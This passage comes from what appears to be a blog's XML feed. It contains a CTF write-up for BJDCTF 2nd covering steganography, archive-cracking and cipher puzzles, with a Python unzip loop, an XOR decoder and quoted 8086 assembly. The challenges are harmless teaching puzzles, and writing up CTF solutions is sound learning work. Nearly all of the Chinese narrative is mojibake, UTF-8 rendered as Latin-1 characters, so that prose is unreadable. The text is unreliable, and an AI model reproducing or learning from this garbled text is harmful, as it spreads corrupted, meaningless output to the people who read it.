</p><p>etc.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Web </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | BJDCTF 2nd WriteUp</title>
      <link href="2020/03/23/CTF_BJDCTF2nd/"/>
      <url>2020/03/23/CTF_BJDCTF2nd/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p>æœ¬å±ŠBJDCTFç”±æ±Ÿè‹ç§‘æŠ€å¤§å­¦ã€åŒ—äº¬å·¥ä¸šå¤§å­¦ã€è¥¿å—æ°‘æ—å¤§å­¦ã€æ­å·å¸ˆèŒƒå¤§å­¦ã€ æ±Ÿè‹å¤§å­¦ã€æ¹–å—å·¥ä¸šå¤§å­¦ï¼ˆæ’åä¸åˆ†å…ˆåï¼‰è”åˆä¸¾åŠ</p></blockquote><p>åˆ’æ°´åˆ’æ°´~ å‘¨æœ«æ°´äº†ä¸€ä¸‹ BJDCTF 2ndã€‚</p><p>çœ‹äº†ä¸€ä¸‹ï¼Œå¥½åƒ BJDCTF 2020 å·²ç»æœ‰è¿‡ä¸€è½®æ¯”èµ›äº†å”‰ï¼Œè¿™æ˜¯ç¬¬äºŒå±Šäº†ï¼Ÿï¼Ÿï¼Ÿï¼ˆä¸€ä¸ªæœˆä¸€å±Šï¼Ÿ</p><p>å®˜æ–¹å£°ç§°è¿™æ˜¯ä¸€ä¸ª<strong>èŒæ–°èµ›</strong>ï¼Œæ€»ä½“éš¾åº¦ä¸ç®—å¾ˆå¤§ï¼Œäºæ˜¯å°±æ¥ç©äº†ä¸€ä¸‹ã€‚</p><p>ç„¶è€Œå–µå–µå–µï¼Œçš„ç¡®è®©æˆ‘çŸ¥é“äº†è‡ªå·±æœ¬æ¥å°±æ˜¯èŒæ–°ã€‚å˜¤å˜¤å˜¤ã€‚</p><p>é¢˜ç›®åœ¨è¿™é‡Œâ†“ã€‚</p><blockquote><p>BUUCTF å…¬å¼€èµ›é“ï¼š<a href="https://buuoj.cn/">æˆ³è¿™é‡Œ</a><br>hint æ±‡æ€»ï¼š<a href="http://gem-love.com/BJDCTF_hint.html">åœ¨è¿™é‡Œ</a></p></blockquote><p>è¿™æ¬¡ç©çš„ä¸å¤šï¼Œä¸»è¦åšäº†ç‚¹ Misc, Crypto, Reverse çš„é¢˜ï¼ŒWeb æ²¡æ€ä¹ˆçœ‹ï¼ˆåé¢å¯èƒ½ä¼šå­¦ä¸€ä¸‹ PHPã€SQL å§ï¼‰ï¼Œpwn æ²¡çœ‹â€¦â€¦</p><p>ç®€å•å†™ä¸€ä¸‹ WriteUp å§ï¼Œæœ‰çš„å‚è€ƒäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„æ€è·¯ï¼Œ<del>ä¸å®Œå–„çš„åé¢å†è¡¥å§</del>ã€‚</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="æœ€ç®€å•çš„misc-y1ng"><a href="#æœ€ç®€å•çš„misc-y1ng" class="headerlink" title="æœ€ç®€å•çš„misc-y1ng"></a>æœ€ç®€å•çš„misc-y1ng</h3><p>å‹ç¼©åŒ…ä¼ªåŠ å¯†ï¼Œæœ«å°¾ä¸¤ä¸ª 504B0102 ä¹‹åçš„åŠ å¯†ä½æ”¹ä¸º 00.</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/PK00.png" alt="ä¼ªåŠ å¯†"></p><p>è§£å‹åçœ‹åˆ°æ˜¯ IHDR ï¼Œå™¢æ˜¯ pngï¼Œè¡¥ä¸Šæ–‡ä»¶å¤´ 89504E47.</p><p>å¾—åˆ°ä¸‹é¢çš„å›¾ç‰‡ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/secret.png" alt="secret"></p><p><code>424A447B79316E677A756973687561697D</code></p><p>hex è½¬ ASCII    </p><p><code>BJD{y1ngzuishuai}</code></p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>å›¾ç‰‡å¤§å°æ”¹äº†ã€‚ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture.png" alt="æ”¹å¤§å°"></p><p>å¾—åˆ°</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc-A_Beautiful_Picture-DreamerJack1.png"></p><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/ezbb.jpg" alt="é¢˜ç›®"></p><p>å›¾ç‰‡äºŒè¿›åˆ¶æ‹¼æ¥éšå†™ï¼Œæå–å¾—åˆ°å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œæ˜¯ <code>é‡Œé¢éƒ½æ˜¯å‡ºé¢˜äºº.jpg</code>ã€‚</p><p>åå…­è¿›åˆ¶ç¼–è¾‘å™¨çœ‹å‘ç°æ˜¯ avi æ ¼å¼ã€‚æ”¹åç¼€æ’­æ”¾ï¼Œå™¢æ˜¯ <del>æ€§æ„Ÿ</del>é’‰é’‰åœ¨çº¿æ±‚é¥¶ çš„è§†é¢‘ã€‚</p><p>å‘ç°æ’å…¥äº†å‡ ä¸ªå›¾ç‰‡ï¼Œè¿˜æœ‰äºŒç»´ç ã€‚</p><p>äºæ˜¯ PR å¤§æ³•å¥½ã€‚é€å¸§çœ‹å¾—åˆ°ä¸‹é¢å‡ å¼ äºŒç»´ç ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa1.png" alt="Misc_EasyBaBa1"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa2.png" alt="Misc_EasyBaBa2"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa3.png" alt="Misc_EasyBaBa3"></p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_EasyBaBa4.png" alt="Misc_EasyBaBa4"></p><p>åˆ†åˆ«å¾—åˆ°</p><p>6167696E5F6C   -&gt;  agin_l</p><p>6F76655F59        -&gt;   ove_Y</p><p>424A447B696D   -&gt;  BJD{im</p><p>316E677D            -&gt;  1ng}</p><p>è¿æˆä¸€å¥è¯</p><p><code>BJD{imagin_love_Y1ng}</code></p><p><em>ï¼ˆè¿™ä¿©å•¥å…³ç³»å”‰ å˜¤å˜¤å˜¤</em> </p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/ezbb_r.png" alt="é¢˜ç›®"></p><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ LSB ä¹‹ç±»çš„ï¼Œçœ‹äº†å„ä¸ªå›¾å±‚éƒ½æ²¡æ˜æ˜¾çš„ï¼Œä½†æ•´ä½“éƒ½æ˜¯æœ‰æ˜æ˜¾çš„é¢—ç²’æ„Ÿâ€¦â€¦</p><p>åæ¥ä»¥ä¸ºæ˜¯å’Œä¸Šé¢é‚£é¢˜çš„å›¾æœ‰å…³ç³»ï¼Œå¯¹ä¸¤å¼ å›¾åšäº†åŠ å‡ç­‰ç­‰æ“ä½œï¼Œæ²¡æœ‰æ”¶è·ã€‚</p><p>å†çœ‹ hex æ•°æ®ï¼Œè¿™ä¸€å †è¿˜æ˜¯æ„Ÿè§‰åƒäºŒç»´ç ï¼Œè¿™ä¹ˆè§„åˆ™çš„0å’Œ1ã€‚</p><p>æœ€åï¼Œåœ¨æˆ‘å‡†å¤‡å…³æ‰ 010editor çš„æ—¶å€™ï¼Œä¼¸äº†ä¸ªæ‡’è…°ï¼Œä»è¿œå¤„çœ‹ï¼Œå•Šï¼</p><p>è¿™ä¹Ÿå¤ªæœ‰è„‘æ´äº†å§ï¼ï¼ˆè‡ªè¡Œè„‘è¡¥å°†<code>FF</code>æˆ–<code>Ã¿Ã¿</code>çœ‹æˆæ˜¯å®çº¿å°±è¡Œï¼‰</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_RealEasyBaBa.png" alt="Misc_RealEasyBaBa"></p><p>äºæ˜¯å¾—åˆ°flagã€‚</p><p><code>BJD{572154976}</code></p><p><em>ï¼ˆè¿™å¥½åƒæ˜¯ imagin å¸ˆå‚…çš„QQå·å”‰</em></p><h3 id="Imagin-å¼€åœºæ›²"><a href="#Imagin-å¼€åœºæ›²" class="headerlink" title="Imagin - å¼€åœºæ›²"></a>Imagin - å¼€åœºæ›²</h3><p>ä¹‹å‰å°±çœ‹è¿‡è¿™ä¸ª mikutapï¼Œå‰å‡ å¤©æ™šä¸Šè¿˜æœ‰ä¸ªå­¦å¼Ÿ at æˆ‘æ¥ä¸€èµ·ç©ï¼ˆæ¢ç©¶ï¼‰çš„â€¦â€¦</p><p>å°±æ˜¯è¿™ä¸ªâ†’<a href="http://taqini.space/mikutap/">http://taqini.space/mikutap/</a> ï¼Œå¤šæœ‰æ„æ€å‘¢ã€‚</p><p>ä»–è¿™ä¸ªæ¯ä¸€ä¸ªæŒ‰é”®å¯¹åº”ç€ä¸€ä¸ªéŸ³è°ƒå’Œä¸€ä¸ªåŠ¨ç”»ï¼Œç†è®ºä¸Šå¯ä»¥é€†å‘å›å»å¾—åˆ° flagã€‚</p><p>æ‹–è¿› PR äº†åå¤å¬äº†å¥½å¤šéï¼Œç¡®å®šäº†å‡ ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªå­—ç¬¦åº”è¯¥æ˜¯<code>M</code>â€¦â€¦</p><p>åŸæ¥æ˜¯æ ¹æ®éŸ³è°ƒå’ŒåŠ¨ç”»æ¥åˆ¤æ–­çš„ï¼Œæ¢äº†ä¸€ä¸ªæµè§ˆå™¨ï¼Œå‘ç°åŠ¨ç”»ä¸ä¸€æ ·äº†ï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œä¸ç©äº†æƒ¹ã€‚</p><p>æ€è·¯æ„Ÿè§‰å¯ä»¥å…ˆå½•ä¸€æ®µ BGMï¼Œåšä¸€ä¸ª sub æŠŠè§†é¢‘ä¸­çš„ BGM å»é™¤ã€‚è€Œåç»™æ¯ä¸€ä¸ªæŒ‰é”®å½•ä¸€ä¸ªï¼Œç¡®å®šæ˜ å°„å…³ç³»ï¼Œç†è®ºä¸Šå°±èƒ½å”¯ä¸€å¯¹åº”ä¸ŠåŸå§‹æŒ‰é”®ã€‚</p><p>ï¼ˆæ„Ÿè§‰ç›´æ¥å¬å‡ºæ¥çš„çœŸå¼ºï¼Œæ€•ä¸æ˜¯éŸ³æ¸¸å¤§ä½¬ï¼Ÿ</p><h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>è¿™é“é¢˜ä¹‹å‰ä¸€ç›´æ²¡è§£å‡ºæ¥ï¼Œæœ€åæ”¾äº† hint è¯´è§£å‹å¯†ç æ˜¯æ–‡ä»¶åã€‚</p><p>äºæ˜¯æ‰‹åŠ¨è§£å‹äº†å‡ ä¸ªâ€¦â€¦æ¯ä¸ªéƒ½æ˜¯ä¸Šä¸€ä¸ªçš„å¯†ç ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz.png" alt="Misc_targz"></p><p>å‘ç°è¿™æ ·ä¼°è®¡å¥½ä¹…éƒ½è§£ä¸å®Œï¼Œäºæ˜¯å†™ jio æœ¬ï¼</p><p>æœäº†ä¸€ä¸‹å‹ç¼©åŒ…è§£å‹çš„ APIï¼Œæ”¹äº†ä¸€ä¸‹åˆ«äººçš„ä»£ç ï¼Œå†™äº†ä¸ªå¾ªç¯ã€‚</p><p>è€ƒè™‘åˆ°æœ€åçš„ flag å¥—å¨ƒå¾ˆå¤šä¸æ–¹ä¾¿æ‰“å¼€ï¼Œäºæ˜¯å°±ç»Ÿä¸€è§£å‹åˆ°ä¸€ä¸ªç›¸åŒçš„ç›®å½•ä¸‹å¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> zipfile<span class="token keyword">def</span> <span class="token function">unzip_single</span><span class="token punctuation">(</span>src_file<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''     è§£å‹å•ä¸ªæ–‡ä»¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ã€‚    '''</span>    <span class="token keyword">if</span> password<span class="token punctuation">:</span>        password <span class="token operator">=</span> password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    zf <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>dest_dir<span class="token punctuation">,</span> pwd<span class="token operator">=</span>password<span class="token punctuation">)</span>    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    zf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    source_dir <span class="token operator">=</span> <span class="token string">r'./hW1ES89jF'</span>    dest_dir <span class="token operator">=</span> <span class="token string">r'./hW1ES89jF'</span>    password <span class="token operator">=</span> <span class="token string">'OKMIlLVft'</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        entry_dir <span class="token operator">=</span> dest_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">'.tar.gz'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        dest_dir <span class="token operator">=</span> source_dir <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> password        unzip_single<span class="token punctuation">(</span>entry_dir<span class="token punctuation">,</span> dest_dir<span class="token punctuation">,</span> password<span class="token punctuation">)</span>        entry <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span>dest_dir<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> entry<span class="token punctuation">.</span>is_file<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.gz'</span><span class="token punctuation">:</span>            password <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>entry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error!'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span></code></pre><p>è·‘äº†ä¸€ä¸‹å‘ç°æœ€ååœ¨<code>8L0WifU3G</code>è¿™ä¸ªç›®å½•ä¸‹ï¼Œå¥—å¨ƒäº† 299 è¿˜æ˜¯ 300ä¸ªå‹ç¼©åŒ…â€¦â€¦</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_targz2.png" alt="Misc_targz2"></p><p>æ‰“å¼€å¾—åˆ° flagï¼š</p><p><code>BJD{wow_you_can_rea11y_dance}</code></p><h3 id="å°å§å§-y1ng"><a href="#å°å§å§-y1ng" class="headerlink" title="å°å§å§-y1ng"></a>å°å§å§-y1ng</h3><p>è¿™é¢˜çœ‹äº†å¥½ä¹…éƒ½æ²¡åšå‡ºæ¥â€¦â€¦çŸ¥é“å›¾ç‰‡ä¸Šæœ‰æ˜æ˜¾çš„é”™ä½ï¼Œ010editor çš„è„šæœ¬è·‘ä¸ä¸‹å»ã€‚è‚¯å®šæ˜¯æ’å…¥äº†ä¸œè¥¿ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie.png" alt="å°å§å§"></p><p>ç”¨äº† strings æ‰¾ï¼Œç„¶è€Œå¤ªæ‡’æ²¡å¼€ Ubuntuï¼Œæ²¡ç”¨ä¸Š grepï¼Œäºæ˜¯å‡ºäº†ä¸€å †å­—ç¬¦ä¸²æ²¡å‘ç° BJDâ€¦â€¦</p><p>æ€ªæˆ‘æ‡’äº†ï¼ˆè¿ PentestBox éƒ½æ‡’å¾—å¼€ï¼ŒCtrl + F éƒ½æ‡’å¾—ç”¨</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Misc_xiaojiejie_flag.png" alt="flag"></p><p><code>BJD{haokanma_xjj}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h3><p>çŒœå¤§å°çš„æ¸¸æˆå”‰ã€‚ç©ä¸ªæ¯›çº¿ï¼Œæ²¡æœ‰flagï¼</p><p>ä¸¢ IDA é‡Œï¼Œçœ‹å­—ç¬¦ä¸²å°±å¾—åˆ° flagã€‚</p><p><code>BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</code></p><p>æœç„¶æ˜¯ä¸ªéšæœºæ•°é€—ä½ ç©å‘¢ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_guessgame.png" alt="guessgame"></p><h3 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h3><p><img src="/2020/03/23/CTF_BJDCTF2nd/Re_8086.png" alt="8086"></p><p>çœ‹äºšå­åªæ˜¯æŠŠæ•°æ®ç§»åˆ° DS é‡Œï¼Œç„¶åå°±æ­»å¾ªç¯äº†ã€‚</p><p>ä¹‹å‰å­¦çš„å¾®æœºåŸç† æ±‡ç¼–å¿˜å¾—å·®ä¸å¤šäº†â€¦â€¦ï¼ˆæƒ³èµ·æ¥è¿™å­¦æœŸ DSP åé¢ç¼–ç¨‹è¿˜è¦ç”¨åˆ° emmm</p><p>åœ¨ seg dseg é‡Œæœ‰è¿™ä¸€å¨</p><p><code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code></p><p>æƒ³äº†åŠå¤©ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚ã€‚base91 è§£ç ä¸è¡Œã€‚</p><p><del>éš¾é“æ˜¯å¤§å°ç«¯é—®é¢˜ï¼Ÿ</del> ä¸æ˜¯ã€‚</p><p>åé¢æ‰“å¼€äº†ASCIIè¡¨ï¼Œæ—¢ç„¶ flag æ ¼å¼æ˜¯ <code>BJD{.+}</code>ï¼Œå‰å››ä½è‚¯å®šå¯¹åº”ç€<code>BJD{</code>ã€‚è¿™é‡Œå¯¹åº”ç€åˆ—å‡ºæ¥ã€‚</p><table><thead><tr><th>Bin ï¼ˆäºŒè¿›åˆ¶ï¼‰</th><th>Oct ï¼ˆå…«è¿›åˆ¶ï¼‰</th><th>Dec ï¼ˆåè¿›åˆ¶ï¼‰</th><th>Hex ï¼ˆåå…­è¿›åˆ¶ï¼‰</th><th>ç¼©å†™/å­—ç¬¦</th></tr></thead><tbody><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td></tr><tr><td>0100 0010</td><td>0102</td><td>66</td><td>0x42</td><td>B</td></tr><tr><td>0101 0101</td><td>0125</td><td>85</td><td>0x55</td><td>U</td></tr><tr><td>0100 1010</td><td>0112</td><td>74</td><td>0x4A</td><td>J</td></tr><tr><td>0110 0100</td><td>0144</td><td>100</td><td>0x64</td><td>d</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td></tr></tbody></table><p>çªç„¶å°±å‘ç°äº†è§„å¾‹ï¼</p><p>äºŒè¿›åˆ¶åå››ä½æ˜æ˜¾æ˜¯å–äº†åï¼Œå‰å››ä½ä¸­çš„æœ€ä½ä½ä¹Ÿå–äº†ä¸ªåã€‚</p><p>pyä¸€ä¸‹ï¼Œå†™äº†ä¸ªjioæœ¬ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span>s <span class="token operator">=</span> <span class="token string">']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;'</span>output <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x0f</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># æˆ–è€…ç›´æ¥ ^ 0x1f</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    output <span class="token operator">+=</span> temp<span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token comment"># BJD{jack_de_hu1b1an_xuede_henHa0}$</span></code></pre><p>äºæ˜¯å¾—åˆ° flag äº†ï¼</p><p><code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><p>å˜¤ è¦å¥½å¥½å­¦æ±‡ç¼–å‘¢ï¼ˆ</p><blockquote><p>çœ‹äº† WP å‘ç°åŸæ¥æ˜¯è§£å¯†çš„ä»£ç è¢« IDA å½“æˆæ˜¯æ•°æ®äº†ï¼ˆå°±æ˜¯<code>assume ss:dseg, ds:nothing</code> ä¸Šé¢çš„é‚£ä¸€éƒ¨åˆ†ï¼‰ã€‚</p><p>å¥‡æ€ªäº†æˆ‘æ‹¿ emu8086 æ¨¡æ‹Ÿå™¨ä¹Ÿæ²¡çœ‹åˆ°è¿™ä¸€æ®µï¼Œè¿˜è·‘æ­»å¾ªç¯äº†ã€‚å™¢ï¼Œ<strong>æœ¬æ¥å°±æ²¡è·‘åˆ°è§£å¯†é‚£éƒ¨åˆ†ä»£ç ï¼</strong></p><p>å·ä¸€ä¸‹å‡ºé¢˜å¸ˆå‚…çš„æºä»£ç ï¼Œæ¥è‡ª<a href="https://renjikai.com/bjdctf-2-dreamerjack/">è¿™é‡Œ</a>ã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">DATAS SEGMENT    str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H    DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH    DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H    DB 77H,7aH,71H,57H,7eH,2fH,62H,59DATAS ENDSSTACKS SEGMENTSTACKS ENDSCODES SEGMENT    ASSUME CS:CODES,DS:DATAS,SS:STACKSloc:    jmp loc    mov CX,34    lea BX,str1   lop:    mov DI,CX    dec DI    xor BYTE PTR [BX][DI],31    loop lop    lea DX,str1    mov AH,09H    int 21H    retSTART:    MOV AX,DATAS    MOV DS,AX    call loc    MOV AH,4CH    INT 21HCODES ENDS    END START</code></pre><p>è§£å¯†çš„éƒ¨åˆ†åœ¨<code>lop</code>é‡Œï¼Œæœç„¶æ˜¯å’Œ 31ï¼ˆ0x1Fï¼‰åš xorã€‚</p></blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ç­¾åˆ°-y1ng"><a href="#ç­¾åˆ°-y1ng" class="headerlink" title="ç­¾åˆ°-y1ng"></a>ç­¾åˆ°-y1ng</h3><p><code>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==</code></p><p>base64 å°±è¡Œäº†ã€‚</p><p><code>BJD{W3lc0me_T0_BJDCTF}</code></p><h3 id="ç‡•è¨€ç‡•è¯­-y1ng"><a href="#ç‡•è¨€ç‡•è¯­-y1ng" class="headerlink" title="ç‡•è¨€ç‡•è¯­-y1ng"></a>ç‡•è¨€ç‡•è¯­-y1ng</h3><p><code>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</code></p><p>hex to ASCIIï¼š</p><p><code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code> </p><p>è¿™ä¸ªè¯•äº†å„ç§å¯†ç ï¼ŒçœŸæ²¡æƒ³åˆ°æ˜¯ vigenere å¯†ç ï¼Œè¿˜åœ¨æƒ³ yanzi æ˜¯å¹²å•¥ç”¨çš„â€¦â€¦</p><p>ï¼ˆä¸‹æ¬¡å…ˆè€ƒè™‘å¸¦æœ‰å¯†é’¥çš„</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_yanzi.png" alt="yanzi"></p><p><code>BJD{yanzi_jiushige_shabi}</code></p><blockquote><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p></blockquote><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><pre class="language-none"><code class="language-none">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>æ•´äº†åŠå¤©ä¸çŸ¥é“å’‹åŠï¼Œæœ€åæƒ³èµ·æ¥è¿˜æœ‰ä¸ªè¯é¢‘å¤§æ³•ï¼</p><p>æœäº†ä¸€ä¸‹ï¼Œ<a href="https://quipqiup.com/">è¿™ä¸ªç½‘ç«™</a> å¯ä»¥åˆ†æè¯é¢‘ã€‚</p><p><img src="/2020/03/23/CTF_BJDCTF2nd/Crypto_Yinglish.png" alt="quipquip"></p><p>å¾ˆæ˜æ˜¾<code>MIH</code>å¯¹åº”ç€<code>BJD</code>ã€‚ä¸‹é¢æœ€åƒçš„å°±æ˜¯è¿™ä¸ªäº†ã€‚</p><pre class="language-none"><code class="language-none">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy}</code></pre><p>ç„¶è€Œäº¤ä¸Šå»ä¸å¯¹ã€‚ã€‚</p><p>çœ‹äº† hint è¯´</p><blockquote><p>æ”¹æˆCr4zyæ˜¯é”™è¯¯çš„</p></blockquote><p>çªç„¶æƒ³åˆ°æ˜¯<code>crack</code>ï¼äºæ˜¯å¾—åˆ° flagã€‚ï¼ˆçœŸå°± quipquip è¿™ä¸ªç½‘ç«™å•Š</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>è¿™æ˜¯ä¸€å¼ æœ‰ç€ä¸€å †å–µå–µçš„ 